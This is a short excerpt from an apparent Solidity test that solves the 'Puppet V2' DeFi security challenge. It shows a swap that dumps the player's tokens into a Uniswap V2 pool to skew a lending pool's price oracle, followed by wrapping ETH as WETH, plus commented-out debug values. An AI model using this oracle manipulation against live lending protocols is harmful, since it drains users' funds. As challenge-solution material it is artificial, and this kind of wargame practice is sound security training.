...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public checkSolvedByPlayer {
        ...
        uniswapV2Router.swapExactTokensForETH(token.balanceOf(address(player)), 1 ether, path, address(player), block.timestamp);

        weth.deposit{value: player.balance}();
        // assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), weth.balanceOf(player), "Test");
        // 29496494833197321980
        // 29900695134061569016
